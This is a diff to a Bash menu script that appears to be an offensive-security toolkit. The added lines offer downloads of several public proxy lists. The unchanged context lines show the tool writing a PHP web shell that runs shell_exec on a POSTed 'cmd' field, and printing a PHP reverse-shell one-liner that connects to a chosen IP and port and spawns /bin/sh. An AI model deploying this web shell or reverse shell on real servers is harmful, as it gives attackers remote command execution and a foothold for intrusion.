@@ -764,6 +764,11 @@ while true; do
 	echo "ZIP"
 	echo -ne " 43. The404Hacking/ZIP-Password-BruteForcer\t237. mnismt/CompressedCrack\n"
 	echo "$SEP"
+	echo "PROXY SERVERS (HTTP SOCKS4 SOCKS5)"
+	echo -ne " 106. clarketm/proxy-list\t107. opsxcq/proxy-list\t108. a2u/free-proxy-list\n"
+	echo -ne " 109. cristiangonzales/Amazon-Discounts/proxy-list\t117. TheSpeedX/PROXY-List\t118. labic/ze-the-scraper/proxies-list\n"
+	echo -ne " 119. samrocketman/proxylist\n"
+	echo "$SEP"
 	echo "?"
 	echo -ne " 36. SigPloiter/HLR-Lookups\t\t\t37. i3visio/osrframework\t\t\t\t38. secdev/scapy\n"
 	echo -ne " 39. vanhauser-thc/thc-ipv6\t\t\t225. idapython/src\t\t\t\t\t226. erocarrera/pefile\n"
@@ -1459,6 +1464,18 @@ while true; do
 			echo "file path is empty"
 		fi
 	;;
+	"106")
+		Scarica "$ENTRAW""clarketm/proxy-list/master/proxy-list-raw.txt"
+	;;
+	"107")
+		Scarica "$ENTRAW""opsxcq/proxy-list/master/list.txt"
+	;;
+	"108")
+		Scarica "$ENTRAW""a2u/free-proxy-list/master/free-proxy-list.txt"
+	;;
+	"109")
+		Scarica "$ENTRAW""cristiangonzales/Amazon-Discounts/master/proxy-list.txt"
+	;;
 	"110")
 		echo "<?php if (!empty($_POST['cmd'])){echo shell_exec($_POST['cmd']);} ?>" > cmd-post.php
 	;;
@@ -1527,6 +1544,15 @@ while true; do
 				echo "php -r '\$sock=fsockopen(\""$MIP"\",""$MPORT"");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 			fi
 		fi
+	;;
+	"117")
+		Clona "TheSpeedX/PROXY-List"
+	;;
+	"118")
+		Scarica "$ENTRAW""labic/ze-the-scraper/master/proxies-list.txt"
+	;;
+	"119")
+		Scarica "$ENTRAW""samrocketman/samrocketman.github.io/main/proxylist.txt"
 	;;
 	"120")
 		Scarica "$ENTRAW""NetSPI/PS_MultiCrack/master/PS_MultiCrack.sh"
